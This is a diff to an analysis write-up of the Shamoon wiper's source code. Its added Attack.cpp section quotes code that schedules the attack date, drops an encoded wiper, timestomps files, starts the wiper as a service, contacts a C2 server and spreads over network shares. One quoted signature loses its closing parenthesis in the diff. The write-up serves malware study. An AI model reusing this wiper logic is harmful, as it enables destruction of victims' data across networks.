@@ -93,12 +93,8 @@ bool Shamoon::Modules::_32bit::Setup32bitService()
 
 Whereas 64bit has only 
 ```
-bool Shamoon::Modules::_64bit::Get64bitSpecific(WCHAR *szSvcName, WCHAR *szSvcPath)
+bool Shamoon::Modules::_64bit::Get64bitSpecific(WCHAR *szSvcName, WCHAR *szSvcPath
 ```
-
-
-## Handler.cpp
-
 
 ## Infection.cpp
 
@@ -237,6 +233,194 @@ WriteModuleOnSharedPC(g_module_path, szPC_IP);
 ```
 on each iteration 
 
+
+## Attack.cpp
+The attack module contains the functions
+```
+bool GetAttackDateFromFile(WORD *a1);
+int TimeToAttack();
+bool LaunchAttack();
+bool RunAttack(BOOL is_service_running);
+```
+In the Attack.h file, you can also see 
+```
+#define GARBAGE_STRING \
+	"kijjjjnsnjbnncbknbkjadc\r\n" \
+	"kjsdjbhjsdbhfcbsjkhdf	jhg jkhg hjk hjk	\r\n" \
+	"slkdfjkhsbdfjbsdf \r\n" \
+	"klsjdfjhsdkufskjdfh \r\n"
+
+#define GARBAGE_FILE_PATH "c:\\windows\\temp\\out17626867.txt"
+```
+which will probably serve a purpose in covering tracks.
+Additionally, a multitude of information related to time stamps are present, which may aid in avoiding detection
+and having the option to attack in waves, sleeping a bit before the launch is attacked.
+```
+#define A_MINUTE 5
+#define A_HOUR   4
+#define A_DAY    3
+#define A_MONTH  1
+#define A_YEAR   0
+
+#define IS_VALID_CONFIG_(v, m, s, k) { \
+if(atoi(&szData[v*2]) > m) (bIsValidFile = false); else (lpawDate[s] = atoi(&szData[v*2]) + k); \
+	szData[v*2] = 0; \
+}
+
+#define IS_VALID_CONFIG(v, m, s) IS_VALID_CONFIG_(v, m, s, 0)
+#define IS_VALID_CONFIG_YEAR(v, m, s) IS_VALID_CONFIG_(v, m, s, 2000)
+```
+
+The first function appears to retrieve the information on when to launch the attack which is apparent from the name
+```
+bool Shamoon::Modules::Attack::GetAttackDateFromFile(WORD *lpawDate)
+```
+and the helper functions that serve to assess the validity of the date
+```
+bIsValidFile = true;
+			
+IS_VALID_CONFIG(4, 59, A_MINUTE)
+IS_VALID_CONFIG(3, 23, A_HOUR)
+IS_VALID_CONFIG(2, 30, A_DAY)
+IS_VALID_CONFIG(1, 30, A_MONTH)
+IS_VALID_CONFIG_YEAR(0, 98, A_YEAR)
+			
+if(lpawDate[A_DAY] > GetDaysInMonth(lpawDate[A_YEAR], lpawDate[A_MONTH]))
+	bIsValidFile = false;
+```
+If the configuration wasn't able to be read or did not exist, then a default time was set
+```
+if(GetAttackDateFromFile(awDate) == false)
+	{
+		// Default time: 15/8/12 8:08
+		awDate[A_YEAR  ] = 2012;
+		awDate[A_MONTH ] = 8;
+		awDate[A_HOUR  ] = 8;
+		awDate[A_DAY   ] = 15;
+		awDate[A_MINUTE] = 8;
+	}
+	
+```
+which could be compared to the actual time and date
+```
+SYSTEMTIME stNow;
+GetSystemTime(&stNow);
+
+...
+
+if(stNow.wMonth >= awDate[A_MONTH] && stNow.wDay >= awDate[A_DAY] && stNow.wHour >= awDate[A_HOUR] && stNow.wMinute >= awDate[A_MINUTE])
+		return 0;
+```
+
+The next function
+```
+bool Shamoon::Modules::Attack::LaunchAttack()
+```
+Is resposible for getting the wiper via use of a SVC 
+```
+g_dwWiperID = SearchProcessByIdOrName(g_dwWiperID, g_szWiperName);
+	if(g_dwWiperID)
+		goto LABEL_12;
+
+	if(!GetWiperSpecific(g_szWiperName, svc_path))
+```
+It retrieves the wiper
+```
+WriteEncodedResource(svc_path, 0, (LPCWSTR)0x70, L"PKCS12", g_keys[KEY_PKCS12], 4)
+```
+where it proceeds to set a reliable file time to avoid suspicion
+```
+SetReliableFileTime(svc_path);
+```
+and then executes the wiper
+```
+if(StartServiceProcess(g_szWiperName, svc_path, &g_dwWiperID)) // Execute the wiper
+	{
+		
+LABEL_12:
+		/*v4 = LoadImageW(NULL, L"myimage12767", IMAGE_BITMAP, 0, 0, LR_MONOCHROME);
+		if(v4)
+		{
+			// Only 18 characters, that's strange
+			v6.write((const char *)v4, 18);
+		}
+		else
+		{
+			// That part of the code has no sense:
+			// 25 bytes allocated, 20 filled with '@',
+			// 18 written into the file
+			char *awDate = new char[25];
+			
+			// Put some garbage
+			memset(awDate, '@', 20);
+			v6.write(awDate, 18);
+			
+			if(awDate) delete [] awDate;
+		}*/
+		
+		return 1;
+	}
+	
+	return 0;
+}
+```
+The next function 
+```
+bool Shamoon::Modules::Attack::RunAttack(BOOL is_service_running)
+```
+(as the name would have it), runs the launched attack.
+
+It first checks that the service is running, where it initializes necessary sections and objects. It also checks that either
+the variable 'g_ready_to_attak' is true or that it is 'time to attack'
+```
+if(is_service_running == TRUE)
+	{
+		g_ready_to_attack = false;
+		
+		InitializeCriticalSection(&g_critical_section);
+		SvcSleep(GetRandom() % 60 + 60);
+		
+		hObject = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ContactC2Server, NULL, 0, NULL);
+		if(!bSvcStopped)
+		{
+			do
+			{
+				SYSTEM_CRITICAL_SECTION
+				(
+					DeleteWiperModules();
+				)
+				
+				if(g_ready_to_attack || (time_to_attack = TimeToAttack()) == 0)
+				{
+```
+Afterwards, the attack is launched
+```
+SYSTEM_CRITICAL_SECTION (LaunchAttack();)
+```
+If the time didn't match attack time, or ready to attack wasn't already true, the module is saved and a sleep timer is set for a bit
+```
+else
+{
+	Save32bitModule();
+	SvcSleep(60 * time_to_attack + GetRandom() % 60);
+}
+```
+Therefore, on the next iteration of the loop, the attack will be launched since g_ready_to_attack is now set to true.
+
+After the function ends, the SVC connection is apparently closed, and the critical section is deleted (I imagine to cover tracks)
+```
+if(hObject != NULL)
+		{
+			WaitForSingleObject(hObject, WAIT_FAILED);
+			CloseHandle(hObject);
+		}
+		
+		DeleteCriticalSection(&g_critical_section);
+```
+Afterwords, command is handed to Infection.cpp, and the malware spreads on to destroy other computers. The computer is thus fully wiped at this point.
+```
+return (strlenW(g_argv[1]) == 1) ? WriteModuleOnSharedNetwork() : WriteModuleOnSharedPCByArgv();
+```
 
 ## Wiper.cpp
 
